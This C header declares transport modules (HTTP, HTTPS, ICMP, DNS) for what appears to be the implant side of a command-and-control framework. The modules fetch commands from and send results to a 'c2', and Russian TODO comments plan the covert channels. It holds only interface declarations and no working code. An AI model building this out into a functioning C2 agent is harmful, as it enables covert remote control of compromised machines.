#ifndef TRANSPORT_H
#define TRANSPORT_H

#include <stddef.h>

typedef struct {
    const char* name;
    int (*init)(void); //initialization.
    int (*get_command)(char *command, char* task_id, size_t max_len_command, char* agent_id); //fetch command for c2.
    int (*send_result)(char* task_id, char* result); //send result to c2.
    void (*cleanup)(void); //clean resourse before exit
} TransportModule;

extern TransportModule http_transport;
extern TransportModule https_transport;//TODO: реализовать после dns
extern TransportModule icmp_transport;//TODO: после http
extern TransportModule dns_transport; //TODO: после icmp

#endif
